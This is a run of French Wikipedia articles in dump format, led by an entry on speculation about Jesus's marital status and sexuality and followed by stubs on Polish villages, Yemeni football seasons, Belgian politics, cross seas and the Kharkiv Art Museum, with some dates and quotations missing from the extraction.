Sexualité de Jésus

Le Nouveau Testament n'évoque à aucun moment la sexualité de Jésus de Nazareth, laissant les religions et les personnes broder et conjecturer sur sa sexualité, mais aussi son statut civil.
Ainsi il est bon de noter que les prochains textes ne seront que spéculation et non vérité.
Statut civil.
Célibat.
C'est au que l'idée que le Christ était célibataire a commencé à se répandre. Historiquement les rabbins contemporains de Jésus étaient mariés, cependant, certains mouvements religieux, dont celui des Esséniens, valorisaient le choix du célibat et de l'abstinence sexuelle. Le fait qu'un juif pieux âgé d'une trentaine d'années soit célibataire au au moyen-orient pose en effet problème, alors qu'un mariage était accompli au sortir de l’adolescence, période absente des évangiles. Cependant, Saint Paul, lui-même, était célibataire et affirmait n'avoir jamais cédé à la tentation de la chair.
Dans son livre sur Marie de Magdala, l'historien Thierry Murcia, a consacré un chapitre à la question de savoir si Jésus était marié ou non. Au terme de son analyse, ses conclusions sont les suivantes :
Mariage.
Dans la tradition musulmane, Jésus (Îsâ) sera marié et aura des enfants lors de son retour sur terre.
Un papyrus qui daterait prétendument du , l’« Évangile de la femme de Jésus » indiquerait qu'il aurait été marié mais les experts considèrent aujourd'hui que cet évangile est une forgerie de la fin du -début .
Sexualité.
Hétérosexualité.
Certains évangiles apocryphes affirment également que Jésus eut des relations avec des femmes. L'Évangile selon Philippe, un texte gnostique et tardif, rapporte qu'il aimait Marie-Madeleine.
Homosexualité.
Dans les évangiles canoniques, le disciple que Jésus aimait ("ho mathētēs hon ēgapā ho Iēsous") est anonyme, mais il est traditionnellement identifié comme Jean de Zébédée, apôtre et réputé auteur d'un évangile, depuis Irénée, évêque de Lyon au . L'existence du disciple est remise en question par les spécialistes, car cette figure du disciple parfait ne serait que le modèle pour tout chrétien. Si l'Évangile selon Jean n'est qu'une œuvre à plusieurs mains, deux versets insistent pour qu'on croie en une existence réelle : ce disciple se penche sur la poitrine de Jésus et demande qui va le trahir ; il est devant la Croix avec Marie de Nazareth, et Jésus fait de chacun la mère et le fils de l'autre ; il va au tombeau vide le matin de Pâques ; et est présent lorsque Jésus se montre "post mortem" à ses disciples.
L'assertion selon laquelle Jésus et Jean auraient entretenu une relation plus qu'amicale est ancienne : en 1617, le roi d'Écosse et d'Angleterre, Jacques VI et Ier, se défendait franchement et sans honte de son amour pour le duc de Buckingham devant son Conseil privé, qui lui reprochait son favoritisme indécent : 
Frédéric le Grand, roi de Prusse, écrivit "Le Palladion", un « poëme grave » imprimé pour la première fois en 1749, et dont il ne reste aucun exemplaire original. L'édition de 1788 ne censure que le nom de Jésus, mais celle de 1789 donne le texte sans caviardage. Dans ses vers, le roi vient à traiter de sa jeunesse dans un , où il dit que des professeurs jésuites le violaient, et 
En 1967, Hugh Montefiore, évêque de Birmingham, suggère que le célibat de Jésus n'a rien de religieux car il était insolite dans le monde juif :
Ces propos seront méprisés d'après le prêtre anglican Paul Oestricher, dans un article du "Guardian" en 2012, pour qui la relation particulière entretenue entre Jésus et Jean laisse à penser que le premier était , et que cette thèse est beaucoup plus fondée que celle de la relation amoureuse entre Jésus et Marie-Madeleine. Pour Robert A. J. Gagnon, ancien professeur de Nouveau Testament à Pittsbourg et connu pour ses positions anti-LGBT, cette lecture vient : aucun passage ne sous-entend une activité érotique ou sexuelle entre eux, "agapao" et "phileo" n'ont aucune connotation sexuelle, contrairement à "eros", et les juifs condamnaient les relations homosexuelles. D'un autre côté, "eros" n'est jamais utilisé dans la Septante, et "agape" peut très bien y signifier l'amour amical, amoureux, comme dans le "Cantique des Cantiques", mais aussi de l'argent ou du conflit, ce qui a amené Theodore Jennings, théologien, à voir une relation homosexuelle entre les deux personnages bibliques.

</doc>
<doc id="7900044" url="https://fr.wikipedia.org/wiki?curid=7900044" title="Festival du film de Santa Fe">
Festival du film de Santa Fe

Le Festival du film de Santa Fe est un festival de cinéma annuel se déroulant à Santa Fe aux États-Unis.
Il a été créé en 1999 par John Bowman. Il s'est déroulé hors de la présence du public en 2021 et 2022 en raison de la pandémie de Covid-19.
Il figure dans la liste des « 50 festivals de cinéma qui valent le prix d'entrée » établie par "". Il se déroule dans six salles différentes dont le "Lensic" et le "Jean Cocteau". Son directeur artistique est Jacques Paisner.
En 2024 les lauréats sont "Waltzing Matilda" de Petr Slavík et "The Strike" de JoeBill Muñoz et Lucas Guilkey.

</doc>
<doc id="7900046" url="https://fr.wikipedia.org/wiki?curid=7900046" title="Stare Faszczyce">
Stare Faszczyce

Stare Faszczyce [ˈstarɛ faʂˈt͡ʂɨt͡sɛ] est un village polonais de la gmina de Błonie situé dans le powiat de Varsovie-ouest et dans la voïvodie de Mazovie, dans le centre-est de la Pologne.

</doc>
<doc id="7900047" url="https://fr.wikipedia.org/wiki?curid=7900047" title="Santa Fe Film Festival">
Santa Fe Film Festival



</doc>
<doc id="7900054" url="https://fr.wikipedia.org/wiki?curid=7900054" title="Stary Łuszczewek">
Stary Łuszczewek

Stary Łuszczewek [ˈstarɨ wuʂˈt͡ʂɛvɛk] est un village polonais de la gmina de Błonie situé dans le powiat de Varsovie-ouest et dans la voïvodie de Mazovie, dans le centre-est de la Pologne.
Il est situé à environ 7 kilomètres au nord-ouest de Błonie, à 19 kilomètres à l'ouest de Ożarów Mazowiecki (le chef-lieu du district), et à 32 kilomètres à l'ouest de Varsovie.
Le village a une population de 59 habitants en 2000.

</doc>
<doc id="7900058" url="https://fr.wikipedia.org/wiki?curid=7900058" title="Wawrzyszew">
Wawrzyszew

Wawrzyszew [vaˈvʐɨʂɛf] est un village polonais de la gmina de Błonie situé dans le powiat de Varsovie-ouest et dans la voïvodie de Mazovie, dans le centre-est de la Pologne.
Il est situé à environ 3 kilomètres au nord-ouest de Błonie, à 15 kilomètres à l'ouest de Ożarów Mazowiecki (le chef-lieu du district), et à 29 kilomètres à l'ouest de Varsovie.

</doc>
<doc id="7900063" url="https://fr.wikipedia.org/wiki?curid=7900063" title="Championnat du Yémen de football 2005">
Championnat du Yémen de football 2005

La saison 2005 du Championnat du Yémen de football est la treizième édition de la première division au Yémen. Quatorze formations sont rassemblées au sein d'une poule unique et s'affrontent deux fois au cours de la saison, à domicile et à l'extérieur. Les quatre derniers sont relégués et remplacés par les quatre meilleurs clubs de "Division 1", la deuxième division yéménite.
C’est Al-Tilal Aden qui remporte la compétition cette saison après avoir terminé en tête du classement final, avec sept points d'avance sur Al Saqr Ta'izz et neuf sur Al Ahli Sanaa. Il s’agit du second titre de champion du Yémen de l’histoire du club après celui obtenu en 1991.
Compétition.
Le barème de points servant à établir le classement se décompose ainsi :
Matchs.
Barrage de relégation.
A égalité de points à la du classement, la dernière synonyme de maintien parmi l'élite, Al Wehda Club Sanaa et Al Yarmuk al-Rawda doivent s'affronter lors d'un match de barrage pour déterminer quelle formation doit être reléguée en deuxième division.

</doc>
<doc id="7900064" url="https://fr.wikipedia.org/wiki?curid=7900064" title="Witanów">
Witanów

Witanów [viˈtanuf] est un village polonais de la gmina de Błonie situé dans le powiat de Varsovie-ouest et dans la voïvodie de Mazovie, dans le centre-est de la Pologne.
Le village a une population de 153 habitants en 2000.

</doc>
<doc id="7900069" url="https://fr.wikipedia.org/wiki?curid=7900069" title="Witki (Varsovie-ouest)">
Witki (Varsovie-ouest)

Witki [ˈvitki] est un village polonais de la gmina de Błonie situé dans le powiat de Varsovie-ouest et dans la voïvodie de Mazovie, dans le centre-est de la Pologne.
Il est situé à environ 5 kilomètres au nord-est de Błonie, à 11 kilomètres à l'ouest de Ożarów Mazowiecki (le chef-lieu du district), et à 24 kilomètres à l'ouest de Varsovie.

</doc>
<doc id="7900073" url="https://fr.wikipedia.org/wiki?curid=7900073" title="156e demi-brigade de première formation">
156e demi-brigade de première formation



</doc>
<doc id="7900074" url="https://fr.wikipedia.org/wiki?curid=7900074" title="155e demi-brigade de première formation">
155e demi-brigade de première formation



</doc>
<doc id="7900075" url="https://fr.wikipedia.org/wiki?curid=7900075" title="Briche">
Briche



</doc>
<doc id="7900078" url="https://fr.wikipedia.org/wiki?curid=7900078" title="Wola Łuszczewska">
Wola Łuszczewska

Wola Łuszczewska [ˈvɔla wuʂˈt͡ʂɛfska] est un village polonais de la gmina de Błonie situé dans le powiat de Varsovie-ouest et dans la voïvodie de Mazovie, dans le centre-est de la Pologne.

</doc>
<doc id="7900085" url="https://fr.wikipedia.org/wiki?curid=7900085" title="Żukówka">
Żukówka

Żukówka [ʐuˈkufka] est un village polonais de la gmina de Błonie situé dans le powiat de Varsovie-ouest et dans la voïvodie de Mazovie, dans le centre-est de la Pologne.
Le village a une population de 184 habitants en 2000.

</doc>
<doc id="7900088" url="https://fr.wikipedia.org/wiki?curid=7900088" title="John Forbes Nash Jr.">
John Forbes Nash Jr.



</doc>
<doc id="7900093" url="https://fr.wikipedia.org/wiki?curid=7900093" title="Petropedetes dutoiti">
Petropedetes dutoiti



</doc>
<doc id="7900102" url="https://fr.wikipedia.org/wiki?curid=7900102" title="3e bataillon des Fédérés Nationaux">
3e bataillon des Fédérés Nationaux



</doc>
<doc id="7900103" url="https://fr.wikipedia.org/wiki?curid=7900103" title="2e bataillon des Fédérés Nationaux">
2e bataillon des Fédérés Nationaux



</doc>
<doc id="7900105" url="https://fr.wikipedia.org/wiki?curid=7900105" title="Erwin Halletz">
Erwin Halletz

Erwin Halletz (né le à Vienne, mort le dans la même ville) est un compositeur, arrangeur et chef d'orchestre autrichien, aussi bien pour des chansons que pour des musiques de film.
Biographie.
Il reçoit ses premiers cours de violon à 6 ans et son premier diplôme à 12. En 1937, il rentre à l'académie de musique et des arts du spectacle de Vienne, où il étudie, entre autres, la clarinette auprès de Leopold Wlach. Après de premières apparitions dans les bars, il fait son service militaire dans la fanfare, jouant à côté de Peter Kreuder ainsi que dans le grand orchestre de danse dirigé par jusqu'à peu avant la guerre.
En , Halletz intègre l'orchestre monté par le commandement soviétique. En 1946, il est le premier violon de l'Orchestre de Danse de Vienne dirigé par Horst Winter, pour qui il travaille comme arrangeur et écrit ses premières compositions. Il est aussi saxophoniste et chanteur. À partir de 1950, il prend la direction de cet orchestre, participe à de grandes tournées internationales et fait beaucoup d'enregistrements. En 1953, il compose sa première musique de film ; il en écrira plus d'une centaine.
En 1961, il est invité à Monaco puis devient l'arrangeur et le compositeur du Monte Carlo Light Symphony Orchestra pendant 41 ans. En 1979, il est le directeur musical du Eistheater Berlin.
En 1950, il fait la connaissance de la chanteuse Nina Konsta qu'il épouse six ans plus tard.

</doc>
<doc id="7900108" url="https://fr.wikipedia.org/wiki?curid=7900108" title="11e bataillon de la formation d'Orléans">
11e bataillon de la formation d'Orléans



</doc>
<doc id="7900109" url="https://fr.wikipedia.org/wiki?curid=7900109" title="3e bataillon de la formation d'Orléans">
3e bataillon de la formation d'Orléans



</doc>
<doc id="7900115" url="https://fr.wikipedia.org/wiki?curid=7900115" title="KFC '71">
KFC '71

Le KFC'71 est un club de football féminin néerlandais. Fondé en 1971, il arrête ses activités en 2010 à cause de problèmes financiers.

</doc>
<doc id="7900118" url="https://fr.wikipedia.org/wiki?curid=7900118" title="Sergio Zoppi">
Sergio Zoppi

Sergio Zoppi (Sesto Fiorentino, ) est un essayiste et homme politique italien.
Biographie.
Diplômé en sciences politiques à l'université de Florence et en relation avec Giovanni Spadolini il étudie la démocratie chrétienne. Plus tard il devient rédacteur en chef du "Nuovo osservatore" (une revue de centre-droit dirigée par Giulio Pastore), il publie en 1968 son premier livre ("Romolo Murri e la prima Democrazia Cristiana").
Dans les années 70, il commence à s'intéresser au sud de l'Italie, intérêt qu'il garde entre 1976 et 1996. Il est aussi président du groupe FORMEZ, et occupe le poste de secrétaire de la présidence du Conseil de délégation aux Affaires publiques et régionales du premier gouvernement Prodi et sous-secrétaire du ministère de l'Éducation dans le premier gouvernement d'Alema.

</doc>
<doc id="7900120" url="https://fr.wikipedia.org/wiki?curid=7900120" title="Petropedetes martiensseni">
Petropedetes martiensseni



</doc>
<doc id="7900129" url="https://fr.wikipedia.org/wiki?curid=7900129" title="Petropedetes yakusini">
Petropedetes yakusini



</doc>
<doc id="7900131" url="https://fr.wikipedia.org/wiki?curid=7900131" title="Championnat du Yémen de football 2006">
Championnat du Yémen de football 2006

La saison 2006 du Championnat du Yémen de football est la quatorzième édition de la première division au Yémen. Quatorze formations sont rassemblées au sein d'une poule unique et s'affrontent deux fois au cours de la saison, à domicile et à l'extérieur. Les quatre derniers sont relégués et remplacés par les quatre meilleurs clubs de "Division 1", la deuxième division yéménite.
C’est Al Saqr Ta'izz qui remporte la compétition cette saison après avoir terminé en tête du classement final, avec sept points d'avance sur Al-Sha'ab Ibb et douze sur le tenant du titre, Al-Tilal Aden. Il s’agit du tout premier titre de champion du Yémen de l’histoire du club.
Compétition.
Le barème de points servant à établir le classement se décompose ainsi :

</doc>
<doc id="7900132" url="https://fr.wikipedia.org/wiki?curid=7900132" title="4e bataillon de Paris pour la Vendée">
4e bataillon de Paris pour la Vendée



</doc>
<doc id="7900133" url="https://fr.wikipedia.org/wiki?curid=7900133" title="8e bataillon de Paris pour la Vendée">
8e bataillon de Paris pour la Vendée



</doc>
<doc id="7900136" url="https://fr.wikipedia.org/wiki?curid=7900136" title="5e bataillon de Paris pour la Vendée">
5e bataillon de Paris pour la Vendée



</doc>
<doc id="7900137" url="https://fr.wikipedia.org/wiki?curid=7900137" title="Bataillon de l'Unité">
Bataillon de l'Unité



</doc>
<doc id="7900139" url="https://fr.wikipedia.org/wiki?curid=7900139" title="Ensemble Lucilin">
Ensemble Lucilin

Lucilin, ou United Instruments of Lucilin, est un ensemble instrumental luxembourgeois créé en 1999, se vouant exclusivement à la diffusion et à la création d'œuvres des .

</doc>
<doc id="7900142" url="https://fr.wikipedia.org/wiki?curid=7900142" title="Le Test des Cubes de Kohs">
Le Test des Cubes de Kohs



</doc>
<doc id="7900143" url="https://fr.wikipedia.org/wiki?curid=7900143" title="6e bataillon de volontaires de la Côte-d'Or">
6e bataillon de volontaires de la Côte-d'Or



</doc>
<doc id="7900161" url="https://fr.wikipedia.org/wiki?curid=7900161" title="Compagnie franche de Bardon">
Compagnie franche de Bardon



</doc>
<doc id="7900162" url="https://fr.wikipedia.org/wiki?curid=7900162" title="2e bataillon de tirailleurs">
2e bataillon de tirailleurs



</doc>
<doc id="7900163" url="https://fr.wikipedia.org/wiki?curid=7900163" title="23e bataillon de chasseurs">
23e bataillon de chasseurs



</doc>
<doc id="7900165" url="https://fr.wikipedia.org/wiki?curid=7900165" title="VV Rijsoord">
VV Rijsoord

Le VV Rijsoord est un club de football féminin néerlandais basé à Ridderkerk.

</doc>
<doc id="7900168" url="https://fr.wikipedia.org/wiki?curid=7900168" title="17e bataillon de chasseurs">
17e bataillon de chasseurs



</doc>
<doc id="7900171" url="https://fr.wikipedia.org/wiki?curid=7900171" title="Conseil d'État du canton du Tessin">
Conseil d'État du canton du Tessin

Le Conseil d'État du canton du Tessin (en italien : "Consiglio di Stato"), est le gouvernement du canton du Tessin, en Suisse.
Description.
Créé en 1803, le Conseil d'État est une autorité collégiale, composée de cinq membres.
Il est dirigé par le président du gouvernement, suppléé par un vice-président.
Les membres du gouvernement tessinois ne peuvent siéger au Conseil national ou au Conseil des États parallèlement à leur mandat cantonal, ni être membres d'un exécutif ou législatif communal.
Chacun des membres du gouvernement est à la tête d'un département. Depuis 2019, les départements portent les noms suivants :
Élection.
Les membres du Conseil d'État sont élus tous les quatre ans au scrutin proportionnel à un tour au mois d'avril, en même temps que le Grand Conseil. Ils sont élus par le peuple depuis 1891.
Le président du gouvernement et le vice-président sont élus chaque année par le Conseil d'État.
La dernière élection a eu lieu le , pour la législature s'étendant d' à .
Composition actuelle.
Date de l'élection : 
Anciennes compositions.
2019-2023.
Date de l'élection : 
2015-2019.
Date de l'élection : 
2011-2015.
Date de l'élection : 
2007-2011.
Date de l'élection : 
Membres du Conseil d'État du canton du Tessin devenus conseillers fédéraux.
Sur les huit conseillers fédéraux tessinois élus jusqu'en 2017, six sont d'abord passé par le Conseil d'État du Tessin : 

</doc>
<doc id="7900172" url="https://fr.wikipedia.org/wiki?curid=7900172" title="Chasseurs de la Haute-Garonne">
Chasseurs de la Haute-Garonne



</doc>
<doc id="7900173" url="https://fr.wikipedia.org/wiki?curid=7900173" title="Corridor Bruxelles-Wallonie">
Corridor Bruxelles-Wallonie

Le corridor Bruxelles-Wallonie (aussi couloir francophone) est un concept apparu dans la politique belge en 2008 qui propose de désenclaver la Région de Bruxelles-Capitale, majoritairement francophone, en la reliant à la Région wallonne par la création d'un corridor traversant la Région flamande.
Le concept.
La proposition de création d'un corridor Bruxelles-Wallonie émane de représentants politiques belges de langue française et date de la mi-2008. Ce couloir consiste en une étroite bande de terrain traversant la forêt de Soignes sur le territoire de Rhode-Saint-Genèse, comprenant principalement un tronçon de la chaussée de Waterloo (la ), qui serait transféré à la commune bruxelloise d'Uccle.
Par ce couloir la Région Bruxelles-Capitale ne serait plus enclavée dans la Province du Brabant flamand et serait connectée avec la Wallonie en cas de scission de la Belgique.
En retour, les représentants politiques flamands ont exigé un couloir à l'exclave des Fourons, un ensemble de communes faisant partie de la Province de Limbourg.
En réponse à ces demandes, le président de la N-VA Bart De Wever a comparé ce couloir aux Balkans et le scénario imaginé pour Srebrenica. Karel De Gucht a parlé d'un Haut-Karabakh sur Senne.
Au début de , Joëlle Milquet a fait valoir qu'il est souhaitable de prévoir un lien entre Bruxelles et la Wallonie, une sorte de couloir physiquement visible. Dans un entretien avec "La Libre Belgique", elle a déclaré : .

</doc>
<doc id="7900204" url="https://fr.wikipedia.org/wiki?curid=7900204" title="Party Girl (film)">
Party Girl (film)



</doc>
<doc id="7900214" url="https://fr.wikipedia.org/wiki?curid=7900214" title="Société des professionnels des affaires européennes">
Société des professionnels des affaires européennes

La Société des professionnels des affaires européennes (officiellement ', SEAP) est une organisation de lobbies européenne créée en 1997. 
Organisation et objectif.
SEAP est une organisation ouverte à tous les professionnels des affaires européennes, sans distinction de nationalité, pays de résidence ou les intérêts qu'ils représentent: cabinet de conseil, association commerciale, association non gouvernementale, etc. Son objectif est d'encourager les normes les plus élevées de professionnalisme pour l'activité des affaires européennes et favoriser l'auto-régulation de la profession. SEAP représente les intérêts de la profession auprès des institutions européennes et à pour mission d'être reconnu comme un partenaire essentiel par les institutions de l'Union européenne
Fonctionnement.
Les membres sont des personnes physiques. L'adhésion à SEAP nécessite de respecter un "code de conduite". Ce code "succinct et court" a été créé dès 1997. Il énumère les différentes règles éthiques que ses signataires doivent respecter. Son respect s'appuie sur l'auto-régulation. Le code de conduite a été révisé plusieurs fois notamment pour introduire une procédure de non-conformité en 2006. Ce code de conduite est similaire à celui de l'organisation EPACA (") dont les membres se chevauchent avec ceux de SEAP. 
Une assemblée générale annuelle assure la gouvernance de la structure et décide de la composition des membres du conseil pour un mandat de trois ans (2015-2018). Différents comités existent et leur nombre ainsi que leur désignation évoluent: 
Compositions.
SEAP est composé en 2021 d'environ 200 membres. Les membres du conseil d'administration sont principalement des consultants en relations publiques, spécialistes du droit ou membres grandes entreprises.

</doc>
<doc id="7900224" url="https://fr.wikipedia.org/wiki?curid=7900224" title="SV Fortuna Wormerveer">
SV Fortuna Wormerveer

Le SV Fortuna Wormerveer est un club de football amateur des Pays-Bas situé à Wormerveer. Il dispose notamment d'une séction féminine.

</doc>
<doc id="7900229" url="https://fr.wikipedia.org/wiki?curid=7900229" title="Deeper than Rap">
Deeper than Rap

 est le troisième album studio de Rick Ross, sorti le .
L'album s'est classé au Billboard 200, au Top R&amp;B/Hip-Hop Albums, Top Rap Albums et au Top Internet Albums.

</doc>
<doc id="7900232" url="https://fr.wikipedia.org/wiki?curid=7900232" title="Aizawa Seishisai">
Aizawa Seishisai

, né , est un penseur nationaliste japonais de l'école Mito à la fin du shogunat Tokugawa.
En 1799, il participe à la compilation du "Dai Nihonshi" (« Grande histoire du Japon ») entreprise par l'école de Mito.
En 1825, il rédige son "Shinron" (« Nouvelles propositions »), collection d'essais qui traitent principalement du concept de "kokutai" (« essence nationale »), terme que popularise Aizawa. Le "Shinron" avertit de la menace des navires étrangers et devient plus tard un ouvrage de référence pour le mouvement "Sonnō jōi".
En 1840, Aizawa est le premier chef des professeurs de l'école "Kōdōkan" de Mito mais est contraint de démissionner en 1844 lorsque Tokugawa Nariaki démissionne de sa position de maître du domaine. Il retourne ensuite au "Kōdōkan".

</doc>
<doc id="7900233" url="https://fr.wikipedia.org/wiki?curid=7900233" title="Ivan Kozitsine">
Ivan Kozitsine

Ivan Kozitsine (en ) est un joueur russe de volley-ball né le . Il mesure et joue central.

</doc>
<doc id="7900239" url="https://fr.wikipedia.org/wiki?curid=7900239" title="Pascal Vidal">
Pascal Vidal

Pascal Vidal (né en 1949) est un acteur, scénariste et réalisateur français.

</doc>
<doc id="7900242" url="https://fr.wikipedia.org/wiki?curid=7900242" title="Espadon (sous-marin)">
Espadon (sous-marin)

Trois sous-marins de la Marine nationale française ont porté le nom dEspadon :

</doc>
<doc id="7900245" url="https://fr.wikipedia.org/wiki?curid=7900245" title="Peter Gradin">
Peter Gradin

Peter Gradin, né le à Långsele, est un joueur professionnel suédois de hockey sur glace qui évoluait en position d'ailier. Il est le frère de Thomas Gradin.
Carrière.
Son maillot floqué du numéro 11 est retiré de l'équipe du AIK IF.

</doc>
<doc id="7900248" url="https://fr.wikipedia.org/wiki?curid=7900248" title="J.P. Chenet">
J.P. Chenet

J.P. Chenet est un vin de marque français produit depuis 1984 par Les Grands Chais de France. La marque, reconnaissable à sa bouteille au goulot penché, est vendue dans plus de 160 pays.
Histoire.
En 1984, Joseph Helfrich, Directeur des Grands Chais de France, imagine une bouteille reconnaissable entre toutes, car dotée d’un col penché et d'un corps large, pour donner l’impression d’une fabrication artisanale. Baptisée Josephine, celle-ci nécessite une adaptation des outils industriels existants. La marque ainsi lancée prend pour nom J.P. Chenet.
Joseph Helfrich fait le choix de se démarquer en axant sa communication en priorité sur les cépages, et non sur la région d’origine. Le raisin provient de plusieurs caves coopératives agricoles partenaires du sud de la France.
Orientée en priorité pour l’export, la marque rencontre un succès en Allemagne, puis aux Pays-Bas et en Scandinavie. .
Dans le monde.
Le magazine britannique Drinksint.com classe la marque comme étant la de vin mondiale en 2014, ce qui en fait une des marques de vins français des plus valorisante dans le monde.

</doc>
<doc id="7900249" url="https://fr.wikipedia.org/wiki?curid=7900249" title="Championnat d'Algérie de football de troisième division 2012-2013">
Championnat d'Algérie de football de troisième division 2012-2013

La saison 2012-2013 de Division Nationale Amateur est la du championnat d'Algérie de D3 depuis la création de la Ligue nationale du football amateur en 2010. Les 42 participants sont répartis en trois groupes régionaux comprenant 14 clubs chacun.
Classement final.
Le classement est établi sur le barème de points suivant : victoire à 3 points, match nul à 1 et défaite à 0 point.

</doc>
<doc id="7900250" url="https://fr.wikipedia.org/wiki?curid=7900250" title="Mer croisée">
Mer croisée

La mer croisée (également appelée mer carrée ou ondes carrées) est un état de la mer où deux systèmes de vagues se propageant dans deux directions différentes se croisent ; ces états de mer transversaux se structurent en une grande quantité de flux directionnels. 
Ce phénomène peut se produire après le passage d'un front atmosphérique, par exemple dans une dépression, les vagues générées avant le passage du front continuent de se propager pendant qu'un nouveau système de vagues est généré par le vent après le passage du front. Les vagues générées par le nouveau vent croisent celles de l'ancien et créent un motif mouvant potentiellement dangereux. Le phénomène se poursuit jusqu'à ce que les vieilles vagues se dispersent ou se dissipent.
La houle croisée peut se produire lorsque le système de vagues a une plus longue période (houle) que les vagues générées localement par le vent. En zone côtière ou dans des régions de fort courant, le croisement peut être le résultat du phénomène de réfraction.
Controverse sur leur danger potentiel.
Sur internet, de nombreux articles racoleurs dits « pièges à clics » avancent l'idée d'un danger démesuré lié à cette forme de vague, en avançant, par exemple que : . Les navires résisteraient mieux aux grosses vagues lorsqu'ils naviguent directement perpendiculairement aux vagues venant en sens inverse. Dans un scénario de mer croisée, cela devient impossible car naviguer dans un ensemble de vagues nécessite de naviguer parallèlement à l'autre. Selon un guide de la navigation de plaisance .
Cependant, d'autres sources disent au contraire que ces affirmations sont largement exagérées, tout au moins en l'absence d'une forte houle de pleine mer. La rumeur qui prétend serait exagérée. En effet, ce serait la force de la houle qui amènerait le danger plutôt que sa forme.
Le phénomène de mer croisée s'apparente à une mer agitée, les vagues étant des ondes et non des courants, elles sont formées par un déplacement vertical de la masse d'eau, pouvant chahuter tout corps flottant en surface. Ce type de mer reste atypique, surprenant pour un spectateur non averti, et peut être difficile à appréhender pour les baigneurs, les embarcations et les paddles. 

</doc>
<doc id="7900266" url="https://fr.wikipedia.org/wiki?curid=7900266" title="Dmitri Kozlov">
Dmitri Kozlov

Dmitri Igorievitch Kozlov (en ) est un joueur russe de volley-ball né le . Il mesure et joue passeur.

</doc>
<doc id="7900267" url="https://fr.wikipedia.org/wiki?curid=7900267" title="Musée d'Art de Kharkiv">
Musée d'Art de Kharkiv

Le musée d'art de Kharkiv (en russe : Харьковский художественный музей ; en ukrainien : Харківський художній музей) est un musée d'État ukrainien, l'un des plus importants du pays. Il a été fondé en 1905 à Kharkiv.
Histoire.
Le musée est fondé en 1905 sous le nom de musée ("Городской художественно-промышленный музей"). L'historien Dmitri Bagaleï est alors à la tête de la commission des nouvelles acquisitions. En 1907, le peintre Ilia Répine fait don à la demande de ce dernier d'un portrait peint par lui du général Dragomirov.
Le musée est rebaptisé en 1920 ("Церковно-Исторический музей"), car ses œuvres sont principalement des icônes et objets de culte confisqués par les autorités bolchéviques, ainsi que des objets religieux provenant des éparchies de Kharkiv et de Volhynie et des collections de l'université de Kharkiv.
En 1922, le musée perd le qualificatif religieux et prend le nom . Il est alors divisé en trois départements: peinture, sculpture et architecture. Le premier réunit également des gravures et des livres anciens, ainsi qu'une collection d'icônes du . La plupart des tableaux sont des portraits, des paysages ou des scènes de genre datant du , la majorité issue de confiscations.
Dans les années 1930, le musée est fermé au public. Il n'ouvre qu'après la libération de l'occupation allemande en 1944, à nouveau sous le nom de . Entre 1949 et 1965, il porte le nom de , et depuis 1965, de .
Édifice.
Le musée se trouve au de la rue Jon Myronossits à Kharkhiv. L'édifice qui l'abrite a été construit en 1912 selon le projet de l'architecte A. N. Beketov, comme hôtel particulier du brasseur Ignatichtchev, propriétaire de la brasserie industrielle Ivanovski de Kharkiv. Il est bâti en style néoclassique Renaissance avec des éléments de baroque. 
Après la révolution d'Octobre et la formation d'autorités soviétiques à Kharkov, le soviet des commissaires du Peuple d'Ukraine (SNK) s'y installe de 1922 à 1928 sous la direction de Vlas Tchoubar (fusillé en 1939). Après le déménagement du soviet en 1928 dans le bâtiment du Gosprom, l'ancien hôtel particulier Ignatichtchev accueille l'institut Chevchtchenko (aujourd'hui musée Chevchtchenko de Kiev). Après la Seconde Guerre mondiale, le musée d'art s'y installe.
Collections.
Le musée expose dans vingt-cinq salles des œuvres russes et ukrainiennes d'avant la révolution, des œuvres de la période soviétique et des œuvres d'art d'Europe de l'Ouest, ainsi que des pièces d'art décoratif du au .
Parmi les peintres russes ou ukrainiens de la période impériale, on remarque des œuvres d'Anton Lossenko ("Abel", 1768), Brioullov, Aïvazovski, Chichkine, Sourikov, Borovikovski, Levitski, Yarochenko, Borissov-Moussatov, Litovtchenko, Vassili Sokolov, Arkhip Kouïndji ("Printemps précoce", 1890-1895), etc. Le musée abrite la collection la plus importante d'Ukraine de tableaux de Répine (onze tableaux, dont le fameux "Cosaques zaporogues écrivant une lettre au sultan de Turquie", variante de 1889-1893 donnée au musée de Kharkov par la galerie Tretiakov en 1932 ; Portrait de Tatiana Chtchepkina-Koupernik, 1914 ; ainsi que huit feuilles de croquis).
Des représentants de l'art dont le rayonnement s'est effectué surtout localement dans diverses provinces de l'actuelle Ukraine sont aussi présents, comme Taras Chevtchenko ("Autoportrait" qui peignit aussi), Vassilkovski (1854-1917), Martynovitch, Tkatchenko (1860-1916), Levtchenko, Grigoriev (1910-1988). On peut ajouter Nikolaï Samokich ; Mykola Bouratchek, Fédir Krytchevsky, Oleksandr Mourachko, Gueorgui Narbout, Tatiana Iablonskaïa, Henryk Siemiradzki ("Les Pirates isauriens vendant leur butin", 1880), Lev Lagorio ("Dans les montagnes du Caucase"), 1879 ; Nikolaï Pimonenko ("La Réunion", 1908 ; "Victime du fanatisme" ; 1898; "Sinnokis", début 1912 ; "Au marché", 1898) ; Nikolaï Iarochenko, "Funérailles", 1893 ; Grigori Laptchenko, "Printemps précoce", 1830 ; Alexandre Litovtchenko, "L'Ambassadeur italien Calvucci fait dessiner les faucons favoris du tsar Alexis Mikhaïlovitch" (1889), , Opanas Slastion ; Filipp Maliavine, "Pavel Kharitonenko avec son fils", 1911...
Parmi les artistes d'Europe occidentale figurent : Bertel Thorvaldsen, Pieter de Molyn, Parmigianino, Jan van Goyen, Albrecht Dürer, Marcantonio Raimondi, Frans Floris ("Suzanne et les vieillards"), Pietro da Cortona ("Martyre de Saint Laurent"), Andrea Sacchi, Giuseppe Maria Crespi, Giovanni Benedetto Castiglione, Livio Mehus, Jan van Scorel ("L'Apôtre Philippe"), Simon de Vlieger (marine), Joos van Cleve, ("Madone"), Andrea Sacchi, Guido Reni, Ludovico Mazzolino, Francesco Furini, Bartolomeo Manfredi, Livio Mehus, Giovanni Francesco Caroto, Jan van Scorel, Simon de Vlieger, Alexandre Adriaenssen, Jan van Goyen, Esaias van de Velde l'Ancien, ("Paysage", autrefois attribué à Pieter Bruegel le Jeune), Gillis van Tilborch, Nicolas de Largillierre, Klaes Molenaer; etc…
En tout, le musée abrite vingt-cinq mille tableaux, croquis, esquisses, sculptures, objets d'art décoratif, etc.

</doc>
<doc id="7900268" url="https://fr.wikipedia.org/wiki?curid=7900268" title="Robert Prim">
Robert Prim



</doc>
<doc id="7900272" url="https://fr.wikipedia.org/wiki?curid=7900272" title="Ordre de la grande gidouille">
Ordre de la grande gidouille



</doc>
